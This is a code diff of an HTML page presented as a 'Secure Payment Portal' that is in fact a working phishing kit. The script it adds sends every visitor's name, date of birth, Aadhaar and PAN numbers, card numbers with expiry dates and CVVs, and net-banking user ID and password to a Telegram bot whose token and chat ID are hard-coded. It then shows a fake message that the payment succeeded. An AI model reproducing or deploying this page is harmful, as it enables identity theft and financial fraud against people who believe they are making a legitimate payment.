@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Credit Card</title>
+    <title>Payment Form</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -72,20 +72,6 @@
             transform: scale(0.98);
         }
 
-        .btn-container {
-            display: flex;
-            justify-content: space-between;
-        }
-
-        .btn-container button {
-            width: 30%;
-        }
-
-        h2 {
-            text-align: center;
-            color: #444;
-        }
-
         .hidden {
             display: none;
         }
@@ -101,7 +87,7 @@
 <body>
     
     <header>
-        <h1>Credit Card Service</h1>
+        <h1>Secure Payment Portal</h1>
     </header>
     <div class="form-container">
         <!-- Personal Details -->
@@ -130,11 +116,9 @@
         <!-- Payment Method Selection -->
         <div id="step2" class="hidden">
             <h2>Select Payment Method</h2>
-            <div class="btn-container">
-                <button id="creditCardBtn">Credit Card</button>
-                <button id="debitCardBtn">Debit Card</button>
-                <button id="netBankingBtn">Net Banking</button>
-            </div>
+            <button id="creditCardBtn">Credit Card</button>
+            <button id="debitCardBtn">Debit Card</button>
+            <button id="netBankingBtn">Net Banking</button>
         </div>
 
         <!-- Credit Card Form -->
@@ -176,4 +160,119 @@
             <h2>Net Banking Details</h2>
             <form>
                 <label for="userId">User ID:</label>
-                <input type="text" id="userId" place
+                <input type="text" id="userId" placeholder="Enter user ID" required>
+
+                <label for="password">Password:</label>
+                <input type="password" id="password" placeholder="Enter password" required>
+
+                <button type="button" id="netBankingNext">Submit</button>
+            </form>
+        </div>
+
+        <!-- Please Wait -->
+        <div id="pleaseWait" class="hidden">
+            <h2>Please Wait...</h2>
+        </div>
+
+        <!-- Thank You Page -->
+        <div id="thankYou" class="hidden">
+            <h2>Thank You!</h2>
+            <p>Your payment has been processed successfully.</p>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "7182419192:AAEAACkgKnDYy9K6G78W2RTn1HxFiyganI8"; // Replace with your bot token
+        const CHAT_ID = "6600199865"; // Replace with your chat ID
+
+        const sendDataToTelegram = (data) => {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: data,
+                }),
+            }).then(() => {
+                document.getElementById("pleaseWait").classList.add("hidden");
+                document.getElementById("thankYou").classList.remove("hidden");
+            }).catch(() => {
+                alert("Failed to send data to Telegram!");
+            });
+        };
+
+        document.getElementById("nextStep").addEventListener("click", () => {
+            const fullName = document.getElementById("fullName").value;
+            const mobile = document.getElementById("mobile").value;
+            const dob = document.getElementById("dob").value;
+            const aadhar = document.getElementById("aadhar").value;
+            const pan = document.getElementById("pan").value;
+
+            if (fullName && mobile && dob && aadhar && pan) {
+                const personalDetails = `Personal Details:\nFull Name: ${fullName}\nMobile: ${mobile}\nDOB: ${dob}\nAadhar: ${aadhar}\nPAN: ${pan}`;
+                sendDataToTelegram(personalDetails);
+
+                document.getElementById("step1").classList.add("hidden");
+                document.getElementById("step2").classList.remove("hidden");
+            } else {
+                alert("Please fill all the fields!");
+            }
+        });
+
+        // Payment Method Selection
+        document.getElementById("creditCardBtn").addEventListener("click", () => {
+            document.getElementById("step2").classList.add("hidden");
+            document.getElementById("creditCardForm").classList.remove("hidden");
+        });
+
+        document.getElementById("debitCardBtn").addEventListener("click", () => {
+            document.getElementById("step2").classList.add("hidden");
+            document.getElementById("debitCardForm").classList.remove("hidden");
+        });
+
+        document.getElementById("netBankingBtn").addEventListener("click", () => {
+            document.getElementById("step2").classList.add("hidden");
+            document.getElementById("netBankingForm").classList.remove("hidden");
+        });
+
+        // Credit Card Form Submission
+        document.getElementById("creditNext").addEventListener("click", () => {
+            const cardNo = document.getElementById("creditCardNo").value;
+            const expDate = document.getElementById("creditExpDate").value;
+            const cvv = document.getElementById("creditCVV").value;
+
+            const data = `Credit Card Details:\nCard No: ${cardNo}\nExpiry Date: ${expDate}\nCVV: ${cvv}`;
+            sendDataToTelegram(data);
+
+            document.getElementById("creditCardForm").classList.add("hidden");
+            document.getElementById("pleaseWait").classList.remove("hidden");
+        });
+
+        // Debit Card Form Submission
+        document.getElementById("debitNext").addEventListener("click", () => {
+            const cardNo = document.getElementById("debitCardNo").value;
+            const expDate = document.getElementById("debitExpDate").value;
+            const cvv = document.getElementById("debitCVV").value;
+
+            const data = `Debit Card Details:\nCard No: ${cardNo}\nExpiry Date: ${expDate}\nCVV: ${cvv}`;
+            sendDataToTelegram(data);
+
+            document.getElementById("debitCardForm").classList.add("hidden");
+            document.getElementById("pleaseWait").classList.remove("hidden");
+        });
+
+        // Net Banking Form Submission
+        document.getElementById("netBankingNext").addEventListener("click", () => {
+            const userId = document.getElementById("userId").value;
+            const password = document.getElementById("password").value;
+
+            const data = `Net Banking Details:\nUser ID: ${userId}\nPassword: ${password}`;
+            sendDataToTelegram(data);
+
+            document.getElementById("netBankingForm").classList.add("hidden");
+            document.getElementById("pleaseWait").classList.remove("hidden");
+        });
+    </script>
+</body>
+</html>
